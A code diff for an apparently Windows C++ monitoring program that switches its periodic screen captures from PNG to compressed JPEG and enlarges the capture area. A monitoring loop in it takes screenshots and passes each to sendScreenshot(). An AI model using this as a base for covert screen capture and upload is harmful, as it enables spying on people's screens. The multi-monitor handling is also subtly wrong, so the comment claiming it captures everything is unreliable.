@@ -400,25 +400,50 @@ void takeScreenshot(const std::string& filePath) {
     HDC hdcScreen = GetDC(NULL);
     HDC hdcMemory = CreateCompatibleDC(hdcScreen);
     
+    // Get actual screen dimensions (handles multi-monitor and DPI scaling)
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
     
-    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
+    // For high DPI displays, get the actual pixel dimensions
+    int virtualWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int virtualHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    
+    // Use the larger of the two to ensure we capture everything
+    int captureWidth = (virtualWidth > screenWidth) ? virtualWidth : screenWidth;
+    int captureHeight = (virtualHeight > screenHeight) ? virtualHeight : screenHeight;
+    
+    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
     HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
     
-    BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
+    BitBlt(hdcMemory, 0, 0, captureWidth, captureHeight, hdcScreen, 0, 0, SRCCOPY);
     
-    // Save to file using GDI+
+    // Save to file using GDI+ with optimized compression
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     
     Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
-    CLSID pngClsid;
-    GetEncoderClsid(L"image/png", &pngClsid);
+    
+    // Use JPEG encoder for better compression instead of PNG
+    CLSID jpegClsid;
+    GetEncoderClsid(L"image/jpeg", &jpegClsid);
+    
+    // Set JPEG quality parameters for smaller file size
+    Gdiplus::EncoderParameters encoderParams;
+    encoderParams.Count = 1;
+    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
+    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
+    encoderParams.Parameter[0].NumberOfValues = 1;
+    
+    // Set quality to 70% (good balance between quality and size)
+    ULONG quality = 70;
+    encoderParams.Parameter[0].Value = &quality;
     
     std::wstring wFilePath(filePath.begin(), filePath.end());
-    bmp->Save(wFilePath.c_str(), &pngClsid, NULL);
+    // Change extension to .jpg for JPEG format
+    std::wstring jpgPath = wFilePath.substr(0, wFilePath.find_last_of(L'.')) + L".jpg";
+    
+    bmp->Save(jpgPath.c_str(), &jpegClsid, &encoderParams);
     
     delete bmp;
     Gdiplus::GdiplusShutdown(gdiplusToken);
@@ -1067,7 +1092,7 @@ void monitorTask() {
             std::replace(timestamp.begin(), timestamp.end(), ':', '-');
             std::replace(timestamp.begin(), timestamp.end(), ' ', '_');
             
-            std::string screenshotPath = screenshotsDir + "\\screenshot_" + timestamp + ".png";
+            std::string screenshotPath = screenshotsDir + "\\screenshot_" + timestamp + ".jpg";
             takeScreenshot(screenshotPath);
             sendScreenshot(screenshotPath);
             
